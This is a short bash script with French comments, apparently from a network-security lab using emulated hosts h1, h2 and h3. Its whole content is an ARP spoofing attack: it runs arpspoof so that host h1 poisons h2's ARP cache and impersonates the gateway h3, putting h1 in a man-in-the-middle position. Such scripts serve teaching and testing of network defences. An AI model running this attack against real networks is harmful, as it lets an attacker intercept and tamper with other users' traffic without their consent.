#!/bin/bash
# ARP Spoofing — h1 se fait passer pour h3 (gateway)
echo "[ATTACK] ARP Spoofing : 192.168.1.10 → empoisonne h2"
arpspoof -i h1-eth0 \
  -t 192.168.1.20 \
  192.168.1.30
